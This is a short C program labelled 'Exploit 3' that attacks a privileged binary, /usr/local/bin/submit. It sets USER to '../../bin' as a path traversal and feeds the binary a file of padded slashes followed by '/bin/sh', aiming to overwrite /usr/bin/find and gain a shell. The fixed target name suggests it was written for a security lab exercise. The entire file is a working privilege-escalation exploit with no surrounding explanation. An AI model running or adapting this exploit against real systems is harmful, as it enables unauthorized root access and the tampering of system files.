/*
 * Exploit 3: Environment variable / Overwriting usr/bin/find
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/submit" // or submitV2

int main(void) {
  char *args[3];
  char *env[2];
  FILE *sc_file;
  int i;

  sc_file = fopen("find", "w");
  for (i = 0; i < 1020; i++) {
    fputc('/', sc_file);
  }
  fputs("/bin/sh", sc_file);
  fclose(sc_file);

  args[0] = TARGET;
  args[1] = "find"; 
  args[2] = NULL;

  env[0] = "USER=../../bin";
  env[1] = NULL;

  execve(TARGET, args, env);
  // execve only returns if it fails
  fprintf(stderr, "execve failed\n");
  return 1;
}
